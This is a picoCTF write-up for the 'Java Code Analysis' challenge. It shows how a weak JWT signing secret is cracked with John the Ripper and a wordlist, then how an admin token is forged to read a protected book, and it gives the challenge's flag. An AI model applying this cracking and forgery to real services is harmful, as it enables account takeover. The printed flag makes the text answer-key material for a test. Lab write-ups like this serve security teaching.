## Java Code Analysis!?!

[Link to challenge](https://play.picoctf.org/practice/challenge/355)

Write-up:

1. We are instructed to attempt to read the 'Flag' book. We also have access to the
source code, which is stored in `files`. Logging in as `user:user` and attempting
to read flag tells us we need `admin` access to read it.

2. Looking at the Local Storage in browser inspection shows us there is an `auth-token`
that corresponds to a JWT: here it is its decoded version:

    ```json
    {
    "typ": "JWT",
    "alg": "HS256"
    }

    {
    "role": "Free",
    "iss": "bookshelf",
    "exp": 1758097463,
    "iat": 1757492663,
    "userId": 1,
    "email": "user"
    }
    ```

    In the source code, we can see there is an Admin role.

3. Attempting to crack the secret key using `john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt`
works: `SECRET-KEY=1234`

4. We can look at `BookShelfConfig.java` to see the Admin user's data. 
Crafting the following payload, encoding it using `jwt.io` and setting it in Local
Storage (payload decoded version as `token-payload` and full encoded version as `auth-token`)
allows us to login as `admin` and access the flag:

    ```json
    {
    "typ": "JWT",
    "alg": "HS256"
    }

    {
    "role": "Admin",
    "iss": "bookshelf",
    "exp": 1758097463,
    "iat": 1757492663,
    "userId": 2,
    "email": "admin"
    }
    ```

    Flag: **picoCTF{w34k_jwt_n0t_g00d_42f5774a}**